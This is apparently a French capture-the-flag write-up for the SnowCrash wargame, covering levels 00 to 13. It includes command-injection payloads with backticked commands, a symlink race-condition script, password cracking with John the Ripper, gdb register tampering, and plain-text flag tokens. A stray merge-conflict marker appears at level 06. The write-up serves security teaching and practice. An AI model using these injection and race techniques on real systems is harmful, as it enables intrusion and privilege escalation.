
/// LEVEL 00
Vu que je n'ai aucun indice a ma disposition, je me lance innocement a la recherche de fichiers appartenant au group "flag00", et il y en a un !

find / -group flag00 2>/dev/null	=	/usr/sbin/john
cat /usr/sbin/john					=	cdiiddwpgswtgt

Le mot de passe fonctionne pas alors je pose ca sur dcode et un dechiffrement de code cesar de 15 me donne "nottoohardhere" ce qui a l'air credible

de la, bash>su flag00 puis bash>getflag:
"Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias"

/// LEVEL 01
Un simple cat /etc/passwd montre que le mot de passe de flag01 est present sous forme crypt
(Les autres ont un "x" pour montre qu'ils sont en securite dans /etc/shadow, fichier sur lequel nous n'avons aucune permission)

flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

Il suffit d'utiliser l'outil "John The Ripper".
On met la ligne precedente dans un fichier texte puis
./john -format=crypt content/pass.txt
./john --show content/pass.txt

Et cela nous donnes:
"abcdefg"

Plus qu'a faire getflag
f2av5il02puano7naaf6adaaf

/// LEVEL 02

tcpick -C -yU -r level02.pcap

ft_waNDReL0L

kooda2puivaav1idi4f57q8iq

/// LEVEL 03

remplacer echo

qi0maab88jeaj46qoumi7maus

// LEVEL 04

curl -d "x=\`getflag\`" -X POST http://localhost:4747

ne2searoevaevoem4ov4ar8ap

// LEVEL 05

pam_mail + crontab

viuaaale9huek52boumoomioc

// LEVEL 06
<<<<<<< HEAD
=======

[x ${`getflag`}]

wiok45aaoguiboiki2tuin6ub

// LEVEL 07
ptit Reverse enginering
export LOGNAME=\`getflag\`

fiumuikeil55xe9cu4dood66h

//LEVEL 08
On a le fichier token sans les perm mais ./level08 a les perms pour l'ouvrir sauf qu'il y a une protection dedans
Ptit reverse
Si le fichier qu'on lui passe s'appelle token alors il nous degage
Du coup juste a faire un ptit lien symbolique et hop

ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link

quif5eloekouj29ke0vouxean

flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f


//LEVEL 09
ya ./level09 faut comprendre ce qu'il fait. Il retourne argv[1] mais modifie. 
Pour chaque caractere de la chaine: c += index	exemple: abc -> ace

dcp ya le fichier ./token faut le revert avec la meme logique. Je fais un ptit "cat token | od -An -t u1" pour chopper les codes ascii car ya des caracteres cheluxs.

Jmet fait un ptit programme python pour faire "str[i] -= i" et hop j'ai le flag

flag: f3iji1ju5yuevaus41q1afiuq

s5cAJpM8ev6XHw998pRWG728z

//LEVEL 10
Ya un executable qui envoi un fichier a une adresse:6969 et un fichier token
Ptit reverse, on remarque que l'executable fait un access() sur token pour proteger
Et apres il tente de se connecter a l'adresse et envoi un Header puis envoi le contenu du fichier passe en parametre
Celui lui prend quelques secondes donc on va essayer de creer un data-race avec un lien symbolique
Le but est que le lien symbolique change entre le access() le open() pour bypass
Dcp ont fait un bon brut force bien sympa

#!/bin/bash
while [ 1 ]
do
	ln -sf /tmp/hey /tmp/link								# Creer un lien valide
	ln -sf /home/user/level10/token /tmp/link &				# Creer le lien sur token en arriere plan
	/home/user/level10/level10 /tmp/link 10.13.1.6			# Execute le code
done

De cette maniere, ont maximise les chances pour que la tache en arriere plan s'execute apres le access().

flag: woupa2yuojeeaaed06riuj63c

feulo4b72j7edeahuete3no7c

//LEVEL 11
Ya un serveur lua sur 5151 qui demande un mot de passe mais on s'en fou
On va juste lui passer un argument frauduleux car io.popen() présente une grosse faille.
Si on lui passe "foo; `getflag>/tmp/flag`", il executera bien gentillement notre commande en tant que flag11.

level11@SnowCrash:~$ nc localhost 5151
Password: foo; `getflag>/tmp/flag`
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

//LEVEL 12
On a un serveur codé en Perl qui tourne sous Apache, on a acces au .pl dans le home.
L'URL peut conternir 2 arguments x et y. Mais on s'aperçoit que le code comporte une faille, on a la ligne @output = `egrep "^$xx" /tmp/xd 2>&1`; dont on pourrait se servir pour faire une injection.
Mais un curl "localhost:4646/?x=`getflag>/tmp/flag`" serait trop simple.
Il faut se pencher sur les regexp que le code fait precedemment.
Il met l'entiereté de la chaine en Majuscules ce qui rend /tmp/ inutilisable car /TMP/ ne sera pas reconnu et pareil pour getflag.
Sachant que /tmp est le seul répertoire ou l'on peut ecrire des choses, il faut trouver un moyen.
On va donc utiliser /*/ qui va tous selectionner dont /tmp/.
Donc a la place de faire le getflag dans l'argument, on va creer un script qui le fera, notre curl devient donc:
curl "localhost:4646/?x=\`/*/SCRIPT\`"

Et notre script:
#!/bin/sh
getflag>/tmp/f

Et voilà!
g1qKMiRpXf53AWhDaU7FEkczr

//LEVEL 13
On a un programme ./level13 qui nous dis qu'on a pas le bon uuid user quand on l'execute. Il s'attend a l'uuid 4242.
Premier reflexe, on le decompile et on examine, on voit que le programme contient le token hashe et possede une fonctionne qui le dehash pour nous dans le cas ou on a le bon uuid:
    if (getuid() == 0x1092)
        return printf("your token is %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));

On va donc s'amuser avec GDB et desassembler le main() pour recuperer l'assembleur et les addresses de chaque instructions:
> gdb level13
(gdb) disas main
Dump of assembler code for function main:
   0x0804858c <+0>:	push   %ebp
   0x0804858d <+1>:	mov    %esp,%ebp
   0x0804858f <+3>:	and    $0xfffffff0,%esp
   0x08048592 <+6>:	sub    $0x10,%esp
   0x08048595 <+9>:	call   0x8048380 <getuid@plt>
   0x0804859a <+14>:	cmp    $0x1092,%eax
   0x0804859f <+19>:	je     0x80485cb <main+63>
   0x080485a1 <+21>:	call   0x8048380 <getuid@plt>
   0x080485a6 <+26>:	mov    $0x80486c8,%edx
   0x080485ab <+31>:	movl   $0x1092,0x8(%esp)
   0x080485b3 <+39>:	mov    %eax,0x4(%esp)
   0x080485b7 <+43>:	mov    %edx,(%esp)
   0x080485ba <+46>:	call   0x8048360 <printf@plt>
   0x080485bf <+51>:	movl   $0x1,(%esp)
   0x080485c6 <+58>:	call   0x80483a0 <exit@plt>
   0x080485cb <+63>:	movl   $0x80486ef,(%esp)
   0x080485d2 <+70>:	call   0x8048474 <ft_des>
   0x080485d7 <+75>:	mov    $0x8048709,%edx
   0x080485dc <+80>:	mov    %eax,0x4(%esp)
   0x080485e0 <+84>:	mov    %edx,(%esp)
   0x080485e3 <+87>:	call   0x8048360 <printf@plt>
   0x080485e8 <+92>:	leave  
   0x080485e9 <+93>:	ret    

On voit donc le syscall a getuid(), et la ligne qui suit est une comparaison avec l'uuid attendu.
Il nous suffit donc de mettre une breakpoint a l'addresse de la comparaison:
(gdb) break *0x0804859a
On execute le programme
(gdb) run
Et il s'arrete au moment attendu.
On a plus qu'a modifier le registre eax, qui contient le retour de getuid().
(gdb) set $eax=4242
Puis on laisse le programme terminer
(gdb) continue
Continuing.
your token is 2A31L79asukciNyi8uppkEuSx

Voila!

//LEVEL 14
